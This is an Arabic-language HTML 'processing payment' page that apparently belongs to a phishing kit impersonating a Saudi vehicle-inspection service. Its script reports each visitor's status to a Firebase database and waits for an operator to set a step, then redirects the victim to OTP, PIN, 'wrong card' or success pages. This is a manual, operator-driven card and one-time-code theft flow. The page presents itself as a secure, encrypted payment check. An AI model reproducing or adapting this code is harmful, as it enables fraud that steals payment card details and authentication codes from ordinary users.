<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري المعالجة - مركز سلامة المركبات</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <style>
        :root { --main-green: #1e7344; --bg-light: #f7f8fa; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
        
        body { 
            background-color: var(--bg-light); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh;
            flex-direction: column;
            padding: 20px;
        }

        .loading-container {
            background: #fff;
            width: 100%;
            max-width: 400px;
            border-radius: 25px;
            padding: 40px 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
            text-align: center;
        }

        .spinner {
            width: 65px;
            height: 65px;
            border: 6px solid #e0e0e0;
            border-top: 6px solid var(--main-green);
            border-radius: 50%;
            margin: 0 auto 30px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        h2 { font-size: 20px; color: #333; margin-bottom: 15px; font-weight: bold; }
        p { font-size: 14px; color: #666; line-height: 1.8; margin-bottom: 20px; }

        .secure-badge-container {
            margin-top: 25px;
            padding-top: 20px;
            border-top: 1px solid #eee;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
        }
        
        .secure-img { width: 100%; max-width: 200px; height: auto; border-radius: 8px; }
        .secure-text { font-size: 11px; color: #aaa; }
    </style>
</head>
<body>

    <div class="loading-container">
        <div class="spinner"></div>
        <h2>جاري معالجة طلبك...</h2>
        <p>
            فضلاً انتظر قليلاً، يتم الآن التحقق من صحة البيانات مع بوابة الدفع الإلكتروني. <br>
            <strong>يرجى عدم إغلاق المتصفح أو الضغط على زر الرجوع.</strong>
        </p>

        <div class="secure-badge-container">
            <img src="https://i.ibb.co/rKgZj74W/IMG-20260323-WA0008.jpg" class="secure-img" alt="Payment Security">
            <span class="secure-text">اتصال مشفر وآمن 100%</span>
        </div>
    </div>

    <script>
        const firebaseConfig = { 
            apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8...", 
            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/", 
            projectId: "saso-inspection" 
        };
        
        if (!firebase.apps.length) { 
            firebase.initializeApp(firebaseConfig); 
        }
        const database = firebase.database();
        const v_id = localStorage.getItem('v_id');

        if (v_id) {
            // تحديث موقع الزائر وحالته فور الدخول
            database.ref('orders/' + v_id).update({
                next_step: 'waiting', 
                status: 'الزائر قيد الانتظار الآن'
            });

            database.ref('live_sessions/' + v_id).update({
                current_page: "انتظار (Processing)",
                last_seen: new Date().getTime()
            });

            const orderRef = database.ref('orders/' + v_id + '/next_step');
            
            // متغير لمنع التنفيذ عند أول تحميل للصفحة بالأوامر القديمة
            let isFirstLoad = true;

            orderRef.on('value', (snapshot) => {
                const step = snapshot.val();

                // لو دي أول مرة الصفحة تفتح، بنجبر الحالة تبقى waiting ونمنع أي تحويل
                if (isFirstLoad) {
                    isFirstLoad = false;
                    if (step !== 'waiting') {
                        database.ref('orders/' + v_id).update({ next_step: 'waiting' });
                        return; 
                    }
                }
                
                // التوجيه يحصل فقط لو الخطوة اتغيرت لشيء غير waiting بعد ما الزائر دخل الصفحة
                if (step && step !== 'waiting') {
                    if (step === 'go_to_otp' || step === 'wrong_otp') {
                        window.location.href = 'complete-st.html'; 
                    } else if (step === 'go_to_pin') {
                        window.location.href = 'auth-session.html';
                    } else if (step === 'wrong_card') {
                        window.location.href = 'secure-pay-v2.html';
                    } else if (step === 'success') {
                        window.location.href = 'success-page.html';
                    }
                }
            });
        } else {
            window.location.href = 'index.html';
        }
    </script>
</body>
</html>
